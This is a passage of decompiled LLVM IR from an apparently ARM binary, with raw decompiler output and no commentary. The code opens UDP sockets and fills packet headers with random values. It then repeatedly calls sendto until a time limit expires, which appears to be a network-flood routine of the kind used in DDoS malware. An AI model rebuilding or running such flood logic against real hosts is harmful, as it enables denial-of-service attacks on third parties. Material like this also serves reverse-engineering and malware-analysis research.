  store i32 %v3_d934, i32* %r3.global-to-local, align 4
  %v0_d938 = load i32, i32* @r5, align 4
  %v1_d938 = add i32 %v0_d938, 20
  %v2_d938 = inttoptr i32 %v1_d938 to i32*
  %v3_d938 = load i32, i32* %v2_d938, align 4
  %v3_d940 = udiv i32 %v3_d938, 65536
  store i32 %v3_d940, i32* %r2.global-to-local, align 4
  %v5_d944 = mul i32 %v3_d934, 24
  %v1_d948 = load i32, i32* @r8, align 4
  %v2_d948 = add i32 %v1_d948, %v5_d944
  store i32 %v2_d948, i32* %ip.global-to-local, align 4
  %v3_d94c22 = udiv i32 %v3_d938, 16777216
  %v1_d950 = trunc i32 %v3_d94c22 to i8
  %v3_d950 = add i32 %v2_d948, 3
  %v4_d950 = inttoptr i32 %v3_d950 to i8*
  store i8 %v1_d950, i8* %v4_d950, align 1
  %v0_d954 = load i32, i32* %r2.global-to-local, align 4
  %v1_d954 = trunc i32 %v0_d954 to i8
  %v2_d954 = load i32, i32* %ip.global-to-local, align 4
  %v3_d954 = add i32 %v2_d954, 2
  %v4_d954 = inttoptr i32 %v3_d954 to i8*
  store i8 %v1_d954, i8* %v4_d954, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_d95c = load i32, i32* @r5, align 4
  store i32 %v0_d95c, i32* %r1.global-to-local, align 4
  %v0_d960 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_d960, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_d96c = load i32, i32* %ip.global-to-local, align 4
  %v4_d96c = inttoptr i32 %v0_d96c to %sockaddr*
  %v7_d974 = inttoptr i32 %v0_d95c to i32*
  %v9_d974 = call i32 @sendto(i32 %v0_d960, i32* %v7_d974, i32 60, i32 16384, %sockaddr* %v4_d96c, i32 16)
  %v3_d978 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d978, i32* %r3.global-to-local, align 4
  %v1_d97c = add i32 %v3_d978, 1
  store i32 %v1_d97c, i32* %r0.global-to-local, align 4
  %v0_d980 = load i32, i32* %fp.global-to-local, align 4
  %v9_d980 = icmp eq i32 %v0_d980, %v1_d97c
  store i1 %v9_d980, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d97c, i32* %stack_var_-40, align 4
  %v7_d988 = icmp sgt i32 %v0_d980, %v1_d97c
  br i1 %v7_d988, label %dec_label_pc_d98c, label %dec_label_pc_dac0

dec_label_pc_d98c:                                ; preds = %dec_label_pc_d8ec, %dec_label_pc_d884
  %v1_d99c = phi i32 [ %v1_d97c, %dec_label_pc_d8ec ], [ 0, %dec_label_pc_d884 ]
  %v5_d990 = mul i32 %v1_d99c, 24
  %v1_d994 = load i32, i32* @r8, align 4
  %v2_d994 = add i32 %v1_d994, %v5_d990
  store i32 %v2_d994, i32* %r3.global-to-local, align 4
  %v1_d998 = add i32 %v2_d994, 20
  %v2_d998 = inttoptr i32 %v1_d998 to i8*
  %v3_d998 = load i8, i8* %v2_d998, align 1
  %v4_d998 = zext i8 %v3_d998 to i32
  store i32 %v4_d998, i32* %r2.global-to-local, align 4
  %v0_d99c = load i32, i32* %sb.global-to-local, align 4
  %v4_d99c = mul i32 %v1_d99c, 4
  %v5_d99c = add i32 %v0_d99c, %v4_d99c
  %v6_d99c = inttoptr i32 %v5_d99c to i32*
  %v7_d99c = load i32, i32* %v6_d99c, align 4
  store i32 %v7_d99c, i32* @r5, align 4
  %v2_d9a0 = icmp ugt i8 %v3_d998, 30
  %v7_d9a0 = icmp eq i8 %v3_d998, 31
  store i1 %v7_d9a0, i1* %cpsr_z.global-to-local, align 1
  %v1_d9a4 = add i32 %v7_d99c, 20
  store i32 %v1_d9a4, i32* @r6, align 4
  %v2_d9a8 = xor i1 %v7_d9a0, true
  %v3_d9a8 = and i1 %v2_d9a0, %v2_d9a8
  br i1 %v3_d9a8, label %dec_label_pc_d890, label %dec_label_pc_d9ac

dec_label_pc_d9ac:                                ; preds = %dec_label_pc_d98c
  %v1_d9ac = add i32 %v2_d994, 16
  %v2_d9ac = inttoptr i32 %v1_d9ac to i32*
  %v3_d9ac = load i32, i32* %v2_d9ac, align 4
  store i32 %v3_d9ac, i32* %r4.global-to-local, align 4
  %v0_d9b0 = call i32 @function_105b0()
  store i32 %v0_d9b0, i32* %r0.global-to-local, align 4
  %v3_d9b4 = load i32, i32* %stack_var_-40, align 4
  %v5_d9bc = mul i32 %v3_d9b4, 24
  %v0_d9c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_d9c4 = load i32, i32* @r8, align 4
  %v2_d9c4 = add i32 %v1_d9c4, %v5_d9bc
  store i32 %v2_d9c4, i32* %r1.global-to-local, align 4
  %v1_d9c8 = and i32 %v0_d9c0, 65280
  store i32 %v1_d9c8, i32* %r3.global-to-local, align 4
  %v1_d9c0 = udiv i32 %v0_d9c0, 256
  %v3_d9cc = and i32 %v1_d9c0, 65280
  store i32 %v3_d9cc, i32* %r2.global-to-local, align 4
  %v3_d9d0 = mul i32 %v0_d9c0, 16777216
  store i32 %v3_d9d0, i32* %ip.global-to-local, align 4
  %v1_d9d4 = add i32 %v2_d9c4, 20
  %v2_d9d4 = inttoptr i32 %v1_d9d4 to i8*
  %v3_d9d4 = load i8, i8* %v2_d9d4, align 1
  %v4_d9d4 = zext i8 %v3_d9d4 to i32
  %v4_d9d8 = mul nuw nsw i32 %v1_d9c8, 256
  %v5_d9d8 = or i32 %v4_d9d8, %v3_d9d0
  store i32 %v5_d9d8, i32* %ip.global-to-local, align 4
  %v2_d9e0 = call i32 @llvm.bswap.i32(i32 %v0_d9c0)
  %v7_d9e4 = lshr i32 %v0_d9b0, %v4_d9d4
  %v8_d9e4 = add i32 %v7_d9e4, %v2_d9e0
  store i32 %v8_d9e4, i32* %r2.global-to-local, align 4
  %v3_d9f0 = mul i32 %v8_d9e4, 16777216
  %v1_d9e8 = mul i32 %v8_d9e4, 256
  %v4_d9f4 = and i32 %v1_d9e8, 16711680
  %v5_d9f4 = or i32 %v4_d9f4, %v3_d9f0
  store i32 %v5_d9f4, i32* %r1.global-to-local, align 4
  store i32 %v6_d530, i32* %r0.global-to-local, align 4
  %v2_da04 = call i32 @llvm.bswap.i32(i32 %v8_d9e4)
  store i32 %v2_da04, i32* %r3.global-to-local, align 4
  store i1 %v7_d894, i1* %cpsr_z.global-to-local, align 1
  %v1_da0c = load i32, i32* @r5, align 4
  %v2_da0c = add i32 %v1_da0c, 16
  %v3_da0c = inttoptr i32 %v2_da0c to i32*
  store i32 %v2_da04, i32* %v3_da0c, align 4
  br i1 %v2_d894, label %dec_label_pc_da14, label %dec_label_pc_d89c

dec_label_pc_da14:                                ; preds = %dec_label_pc_d9ac, %dec_label_pc_d890
  %v0_da14 = call i32 @function_105b0()
  store i32 %v0_da14, i32* %r0.global-to-local, align 4
  store i32 %v3_d5a4, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_da24, i1* %cpsr_z.global-to-local, align 1
  %v1_da28 = load i32, i32* @r5, align 4
  %v2_da28 = add i32 %v1_da28, 12
  %v3_da28 = inttoptr i32 %v2_da28 to i32*
  store i32 %v0_da14, i32* %v3_da28, align 4
  br i1 %v9_da24, label %dec_label_pc_da30, label %dec_label_pc_da14.dec_label_pc_d8b0_crit_edge

dec_label_pc_da14.dec_label_pc_d8b0_crit_edge:    ; preds = %dec_label_pc_da14
  %v1_d8b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d8b0

dec_label_pc_da30:                                ; preds = %dec_label_pc_da14, %dec_label_pc_d89c
  %v0_da30 = call i32 @function_105b0()
  %v1_da30 = trunc i32 %v0_da30 to i8
  store i32 %v0_da30, i32* %r0.global-to-local, align 4
  %v4_da3425 = udiv i32 %v0_da30, 256
  %v1_da38 = trunc i32 %v4_da3425 to i8
  %v2_da38 = load i32, i32* @r5, align 4
  %v3_da38 = add i32 %v2_da38, 5
  %v4_da38 = inttoptr i32 %v3_da38 to i8*
  store i8 %v1_da38, i8* %v4_da38, align 1
  store i32 %v3_d5a8, i32* %r3.global-to-local, align 4
  %v1_da40 = load i32, i32* @r4, align 4
  %v9_da40 = icmp eq i32 %v3_d5a8, %v1_da40
  store i1 %v9_da40, i1* %cpsr_z.global-to-local, align 1
  %v3_da44 = load i32, i32* @r5, align 4
  %v4_da44 = add i32 %v3_da44, 4
  %v5_da44 = inttoptr i32 %v4_da44 to i8*
  store i8 %v1_da30, i8* %v5_da44, align 1
  %v0_da48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da48, label %dec_label_pc_da4c, label %dec_label_pc_da30.dec_label_pc_d8bc_crit_edge

dec_label_pc_da30.dec_label_pc_d8bc_crit_edge:    ; preds = %dec_label_pc_da30
  %v1_d8c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d8bc

dec_label_pc_da4c:                                ; preds = %dec_label_pc_da30, %dec_label_pc_d8b0
  %v0_da4c = call i32 @function_105b0()
  %v1_da4c = trunc i32 %v0_da4c to i8
  store i32 %v0_da4c, i32* %r0.global-to-local, align 4
  store i32 %v3_d5ac, i32* %ip.global-to-local, align 4
  %v4_da54 = sdiv i32 %v0_da4c, 256
  store i32 %v4_da54, i32* %r3.global-to-local, align 4
  %v1_da58 = load i32, i32* @r4, align 4
  %v9_da58 = icmp eq i32 %v3_d5ac, %v1_da58
  store i1 %v9_da58, i1* %cpsr_z.global-to-local, align 1
  %v3_da5c = load i32, i32* @r5, align 4
  %v4_da5c = add i32 %v3_da5c, 20
  %v5_da5c = inttoptr i32 %v4_da5c to i8*
  store i8 %v1_da4c, i8* %v5_da5c, align 1
  %v0_da60 = load i32, i32* %r3.global-to-local, align 4
  %v1_da60 = trunc i32 %v0_da60 to i8
  %v2_da60 = load i32, i32* @r6, align 4
  %v3_da60 = add i32 %v2_da60, 1
  %v4_da60 = inttoptr i32 %v3_da60 to i8*
  store i8 %v1_da60, i8* %v4_da60, align 1
  %v0_da64 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da64, label %dec_label_pc_da68, label %dec_label_pc_da4c.dec_label_pc_d8c8_crit_edge

dec_label_pc_da4c.dec_label_pc_d8c8_crit_edge:    ; preds = %dec_label_pc_da4c
  %v1_d8cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d8c8

dec_label_pc_da68:                                ; preds = %dec_label_pc_da4c, %dec_label_pc_d8bc
  %v0_da68 = call i32 @function_105b0()
  %v1_da68 = trunc i32 %v0_da68 to i8
  %v4_da6c = sdiv i32 %v0_da68, 256
  store i32 %v4_da6c, i32* %r3.global-to-local, align 4
  %v3_da70 = load i32, i32* @r6, align 4
  %v4_da70 = add i32 %v3_da70, 2
  %v5_da70 = inttoptr i32 %v4_da70 to i8*
  store i8 %v1_da68, i8* %v5_da70, align 1
  store i32 %v6_d46c, i32* %r0.global-to-local, align 4
  %v1_da78 = load i32, i32* @r4, align 4
  %v9_da78 = icmp eq i32 %v6_d46c, %v1_da78
  store i1 %v9_da78, i1* %cpsr_z.global-to-local, align 1
  %v0_da7c = load i32, i32* %r3.global-to-local, align 4
  %v1_da7c = trunc i32 %v0_da7c to i8
  %v2_da7c = load i32, i32* @r6, align 4
  %v3_da7c = add i32 %v2_da7c, 3
  %v4_da7c = inttoptr i32 %v3_da7c to i8*
  store i8 %v1_da7c, i8* %v4_da7c, align 1
  %v0_da80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da80, label %dec_label_pc_da84, label %dec_label_pc_da68.dec_label_pc_d8d4_crit_edge

dec_label_pc_da68.dec_label_pc_d8d4_crit_edge:    ; preds = %dec_label_pc_da68
  %v1_d8d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d8d4

dec_label_pc_da84:                                ; preds = %dec_label_pc_da68, %dec_label_pc_d8c8
  %v0_da84 = call i32 @function_105b0()
  store i32 %v0_da84, i32* %r0.global-to-local, align 4
  store i32 %v6_d484, i32* %r2.global-to-local, align 4
  %v1_da8c = load i32, i32* @r4, align 4
  %v9_da8c = icmp eq i32 %v6_d484, %v1_da8c
  store i1 %v9_da8c, i1* %cpsr_z.global-to-local, align 1
  %v1_da90 = load i32, i32* @r6, align 4
  %v2_da90 = add i32 %v1_da90, 4
  %v3_da90 = inttoptr i32 %v2_da90 to i32*
  store i32 %v0_da84, i32* %v3_da90, align 4
  br i1 %v9_da8c, label %dec_label_pc_da98, label %dec_label_pc_d8e0

dec_label_pc_da98:                                ; preds = %dec_label_pc_da84, %dec_label_pc_d8d4
  %v0_da98 = call i32 @function_105b0()
  store i32 %v0_da98, i32* %r0.global-to-local, align 4
  store i32 %v1_d5b0, i32* %r3.global-to-local, align 4
  store i1 %v2_daa0, i1* %cpsr_z.global-to-local, align 1
  %v1_daa4 = load i32, i32* @r6, align 4
  %v2_daa4 = add i32 %v1_daa4, 8
  %v3_daa4 = inttoptr i32 %v2_daa4 to i32*
  store i32 %v0_da98, i32* %v3_daa4, align 4
  br i1 %v2_daa0, label %dec_label_pc_d8ec, label %dec_label_pc_daac

dec_label_pc_daac:                                ; preds = %dec_label_pc_d8e0, %dec_label_pc_da98
  %v0_daac = call i32 @function_105b0()
  %v1_daac = trunc i32 %v0_daac to i8
  store i32 %v0_daac, i32* %r0.global-to-local, align 4
  %v4_dab0 = sdiv i32 %v0_daac, 256
  store i32 %v4_dab0, i32* %r3.global-to-local, align 4
  %v1_dab4 = trunc i32 %v4_dab0 to i8
  %v2_dab4 = load i32, i32* @r6, align 4
  %v3_dab4 = add i32 %v2_dab4, 19
  %v4_dab4 = inttoptr i32 %v3_dab4 to i8*
  store i8 %v1_dab4, i8* %v4_dab4, align 1
  %v3_dab8 = load i32, i32* @r6, align 4
  %v4_dab8 = add i32 %v3_dab8, 18
  %v5_dab8 = inttoptr i32 %v4_dab8 to i8*
  store i8 %v1_daac, i8* %v5_dab8, align 1
  br label %dec_label_pc_d8ec

dec_label_pc_dac0:                                ; preds = %dec_label_pc_d8ec, %dec_label_pc_d874
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dac4 = call i32 @time(i32* null)
  store i32 %v2_dac4, i32* %r0.global-to-local, align 4
  store i32 %v2_d540, i32* %ip.global-to-local, align 4
  %v9_dacc = icmp eq i32 %v2_d540, %v2_dac4
  store i1 %v9_dacc, i1* %cpsr_z.global-to-local, align 1
  %v6_dad0 = icmp slt i32 %v2_d540, %v2_dac4
  br i1 %v6_dad0, label %dec_label_pc_dad4, label %dec_label_pc_dac0.dec_label_pc_d874_crit_edge

dec_label_pc_dac0.dec_label_pc_d874_crit_edge:    ; preds = %dec_label_pc_dac0
  %v0_d878.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_d874

dec_label_pc_dad4:                                ; preds = %dec_label_pc_dac0, %dec_label_pc_d370, %dec_label_pc_dadc
  %v29_dad8 = phi i32 [ %v3_d554, %dec_label_pc_d370 ], [ %v1_dae0, %dec_label_pc_dadc ], [ %v2_dac4, %dec_label_pc_dac0 ]
  store i32 %v3_d370, i32* %r4.global-to-local, align 4
  store i32 %v6_d370, i32* %r5.global-to-local, align 4
  store i32 %v9_d370, i32* %r6.global-to-local, align 4
  store i32 %v12_d370, i32* %r7.global-to-local, align 4
  ret i32 %v29_dad8

dec_label_pc_dadc:                                ; preds = %dec_label_pc_d564
  %v0_dadc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_dadc, i32* %r0.global-to-local, align 4
  %v1_dae0 = call i32 @close(i32 %v0_dadc)
  store i32 %v1_dae0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dad4

; uselistorder directives
  uselistorder i32 %v1_dae0, { 1, 0 }
  uselistorder i32 %v4_dab0, { 1, 0 }
  uselistorder i32 %v0_daac, { 0, 2, 1 }
  uselistorder i32 %v0_da4c, { 0, 2, 1 }
  uselistorder i32 %v0_da30, { 0, 2, 1 }
  uselistorder i32 %v2_da04, { 1, 0 }
  uselistorder i32 %v8_d9e4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_d9d0, { 1, 0 }
  uselistorder i32 %v0_d9c0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_d97c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_d924, { 0, 2, 1 }
  uselistorder i32 %v0_d90c, { 1, 0, 2 }
  uselistorder i1 %v2_daa0, { 2, 3, 1, 0 }
  uselistorder i1 %v9_da24, { 2, 3, 1, 0 }
  uselistorder i1 %v7_d894, { 2, 1, 0 }
  uselistorder i32 %v1_d864, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d810, { 1, 0 }
  uselistorder i32 %v3_d668, { 1, 0 }
  uselistorder i32 %v1_d660, { 1, 0 }
  uselistorder i32 %v1_d654, { 1, 0 }
  uselistorder i32 %v1_d650, { 1, 0 }
  uselistorder i32 %v1_d630, { 1, 0 }
  uselistorder i32 %v1_d62c, { 1, 0 }
  uselistorder i32 %v1_d620, { 1, 0 }
  uselistorder i32 %v1_d5ec, { 1, 0 }
  uselistorder i32 %v0_d5b8, { 1, 0, 2 }
  uselistorder i32 %v1_d5b0, { 2, 1, 3, 0 }
  uselistorder i32 %v3_d5a8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_d5a4, { 1, 2, 0, 3 }
  uselistorder i1 %v7_d584, { 1, 0 }
  uselistorder i1 %v7_d558, { 1, 0 }
  uselistorder i32 %v3_d554, { 1, 2, 0, 3 }
  uselistorder i32 %v2_d540, { 2, 1, 0 }
  uselistorder i32 %v6_d530, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_d484, { 3, 2, 1, 0 }
  uselistorder i32 %v6_d46c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_d450, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_d434, { 1, 0, 3, 2 }
  uselistorder i32 %v1_d41c, { 1, 0 }
  uselistorder i32 %v5_d3b4, { 1, 0 }
  uselistorder i32 %v1_d374, { 1, 2, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 13, 11, 12 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 16, 10, 11, 12, 13, 14, 15, 20, 17, 18, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 13, 14, 15, 12, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 19, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 52, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 45, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 44, { 3, 4, 5, 6, 0, 7, 1, 8, 2, 9 }
  uselistorder i32 46, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 43, { 1, 0, 4, 2, 5, 3, 6 }
  uselistorder i32 42, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder label %dec_label_pc_dad4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_daac, { 1, 0 }
  uselistorder label %dec_label_pc_d8ec, { 2, 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_daec(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_daec:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-84 = alloca i8, align 1
  %v3_daec = load i32, i32* @r4, align 4
  %v6_daec = load i32, i32* @r5, align 4
  %v9_daec = load i32, i32* @r6, align 4
  %v1_daf0 = urem i32 %arg2, 256
  store i32 %v1_daf0, i32* @sl, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %v1_daf0, i32* %r0.global-to-local, align 4
  %v1_db04 = urem i32 %arg4, 256
  store i32 %v1_db04, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  %v2_db10 = call i32* @calloc(i32 %v1_daf0, i32 4)
  %v4_db10 = ptrtoint i32* %v2_db10 to i32
  %v0_db1c = load i32, i32* @sl, align 4
  store i32 %v0_db1c, i32* %r0.global-to-local, align 4
  %v2_db20 = call i32* @calloc(i32 %v0_db1c, i32 4)
  %v3_db20 = ptrtoint i32* %v2_db20 to i32
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r6, align 4
  %v0_db2c = load i32, i32* @r5, align 4
  store i32 %v3_db20, i32* @sb, align 4
  %v0_db3c = load i32, i32* @r4, align 4
  store i32 %v0_db3c, i32* %r0.global-to-local, align 4
  %v4_db40 = inttoptr i32 %v0_db2c to i32*
  %v5_db40 = call i32 @function_ad24(i32 %v0_db3c, i32* %v4_db40, i32 7, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_db44 = load i32, i32* @r5, align 4
  %v0_db50 = load i32, i32* @r6, align 4
  %v0_db54 = load i32, i32* @r4, align 4
  store i32 %v0_db54, i32* %r0.global-to-local, align 4
  %v3_db58 = urem i32 %v5_db40, 65536
  store i32 %v3_db58, i32* @fp, align 4
  %v4_db5c = inttoptr i32 %v0_db44 to i32*
  %v5_db5c = call i32 @function_ad24(i32 %v0_db54, i32* %v4_db5c, i32 6, i32 %v0_db50)
  %v0_db60 = load i32, i32* @r5, align 4
  %v3_db64 = mul i32 %v5_db5c, 65536
  store i32 %v3_db64, i32* @r8, align 4
  %v0_db70 = load i32, i32* @r4, align 4
  store i32 %v0_db70, i32* %r0.global-to-local, align 4
  %v4_db74 = inttoptr i32 %v0_db60 to i32*
  %v5_db74 = call i32 @function_ad24(i32 %v0_db70, i32* %v4_db74, i32 0, i32 512)
  %v3_db84 = urem i32 %v5_db74, 65536
  %v0_db88 = load i32, i32* @r5, align 4
  %v0_db8c = load i32, i32* @r4, align 4
  store i32 %v0_db8c, i32* %r0.global-to-local, align 4
  %v4_db94 = inttoptr i32 %v0_db88 to i32*
  %v5_db94 = call i32 @function_ad24(i32 %v0_db8c, i32* %v4_db94, i32 1, i32 1)
  %v1_dba0 = urem i32 %v5_db94, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_dbbc = call i32 @time(i32* null)
  %v0_dbc0 = load i32, i32* @r8, align 4
  %v3_dbc0 = udiv i32 %v0_dbc0, 65536
  %v1_dbc4 = load i32, i32* @r6, align 4
  %v9_dbc4 = icmp eq i32 %v3_dbc0, %v1_dbc4
  %v1_dbcc4 = load i32, i32* @r7, align 4
  %v2_dbcc5 = add i32 %v1_dbcc4, %v2_dbbc
  store i32 %v2_dbcc5, i32* %r0.global-to-local, align 4
  br i1 %v9_dbc4, label %dec_label_pc_ddb0, label %bb

bb:                                               ; preds = %dec_label_pc_daec
  br label %dec_label_pc_dbe0

dec_label_pc_dbe0:                                ; preds = %bb, %dec_label_pc_ddb0
  %v0_dbe0 = load i32, i32* @sl, align 4
  %tmp47 = icmp slt i32 %v0_dbe0, 1
  br i1 %tmp47, label %dec_label_pc_dd80, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dbe0
  %v0_dbe8 = load i32, i32* @fp, align 4
  %v3_dbe8 = udiv i32 %v0_dbe8, 256
  %v5_dbf4 = trunc i32 %v3_dbe8 to i8
  store i32 0, i32* @r8, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v3_dc10 = udiv i32 %v0_dbe8, 65536
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_dc18 = trunc i32 %v3_dc10 to i8
  store i8 %v4_dc18, i8* %stack_var_-84, align 1
  %tmp48 = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_dc40

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dca0
  %v0_dc20 = load i32, i32* %r6.global-to-local, align 4
  %v1_dc20 = load i32, i32* @sb, align 4
  %v2_dc20 = add i32 %v1_dc20, %v0_dc20
  %v3_dc20 = inttoptr i32 %v2_dc20 to i32*
  %v4_dc20 = load i32, i32* %v3_dc20, align 4
  store i32 %v4_dc20, i32* %r0.global-to-local, align 4
  %v1_dc24 = inttoptr i32 %v0_dcc4 to %sockaddr*
  %v5_dc2c = call i32 @connect(i32 %v4_dc20, %sockaddr* %v1_dc24, i32 16)
  store i32 %v5_dc2c, i32* %r0.global-to-local, align 4
  %v0_dc30 = load i32, i32* @r8, align 4
  %v1_dc30 = load i32, i32* @sl, align 4
  %v9_dc30 = icmp eq i32 %v0_dc30, %v1_dc30
  %v0_dc34 = load i32, i32* %r6.global-to-local, align 4
  %v1_dc34 = add i32 %v0_dc34, 4
  store i32 %v1_dc34, i32* %r6.global-to-local, align 4
  %v0_dc38 = load i32, i32* %r5.global-to-local, align 4
  %v1_dc38 = add i32 %v0_dc38, 24
  store i32 %v1_dc38, i32* %r5.global-to-local, align 4
  br i1 %v9_dc30, label %dec_label_pc_dd3c, label %dec_label_pc_dc40

dec_label_pc_dc40:                                ; preds = %dec_label_pc_dcd0, %dec_label_pc_dc20, %dec_label_pc_dbe8
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r0.global-to-local, align 4
  %v2_dc4c = call i32* @calloc(i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32 1)
  %v3_dc4c = ptrtoint i32* %v2_dc4c to i32
  store i32 %v3_dc4c, i32* %r0.global-to-local, align 4
  %v0_dc54 = load i32, i32* @fp, align 4
  %v9_dc54 = icmp eq i32 %v0_dc54, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v1_dc5c = load i32, i32* %r6.global-to-local, align 4
  %v3_dc5c = add i32 %v1_dc5c, %v4_db10
  %v4_dc5c = inttoptr i32 %v3_dc5c to i32*
  store i32 %v3_dc4c, i32* %v4_dc5c, align 4
  br i1 %v9_dc54, label %dec_label_pc_dd9c, label %dec_label_pc_dc64

dec_label_pc_dc64:                                ; preds = %dec_label_pc_dc40
  %v2_dc68 = load i32, i32* %r5.global-to-local, align 4
  %v3_dc68 = add i32 %v2_dc68, 2
  %v4_dc68 = inttoptr i32 %v3_dc68 to i8*
  store i8 %v5_dbf4, i8* %v4_dc68, align 1
  %v2_dc6c = load i8, i8* %stack_var_-84, align 1
  %v2_dc70 = load i32, i32* %r5.global-to-local, align 4
  %v3_dc70 = add i32 %v2_dc70, 3
  %v4_dc70 = inttoptr i32 %v3_dc70 to i8*
  store i8 %v2_dc6c, i8* %v4_dc70, align 1
  br label %dec_label_pc_dc74

dec_label_pc_dc74:                                ; preds = %dec_label_pc_dd9c, %dec_label_pc_dc64
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_dc80 = call i32 @socket(i32 2, i32 17, i32 17)
  store i32 %v3_dc80, i32* %r0.global-to-local, align 4
  %v7_dc84 = icmp eq i32 %v3_dc80, -1
  %v0_dc88 = load i32, i32* @r8, align 4
  %v1_dc88 = add i32 %v0_dc88, 1
  store i32 %v1_dc88, i32* @r8, align 4
  %v1_dc98 = load i32, i32* %r6.global-to-local, align 4
  %v2_dc98 = load i32, i32* @sb, align 4
  %v3_dc98 = add i32 %v2_dc98, %v1_dc98
  %v4_dc98 = inttoptr i32 %v3_dc98 to i32*
  store i32 %v3_dc80, i32* %v4_dc98, align 4
  br i1 %v7_dc84, label %dec_label_pc_dd94.loopexit, label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %dec_label_pc_dc74
  store i32 2, i32* %stack_var_-52, align 4
  %v0_dcc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_dcc0 = call i32 @bind(i32 %v0_dcc0, %sockaddr* %tmp48, i32 16)
  store i32 %v5_dcc0, i32* %r0.global-to-local, align 4
  %v0_dcc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_dcc4 = add i32 %v0_dcc4, 20
  %v2_dcc4 = inttoptr i32 %v1_dcc4 to i8*
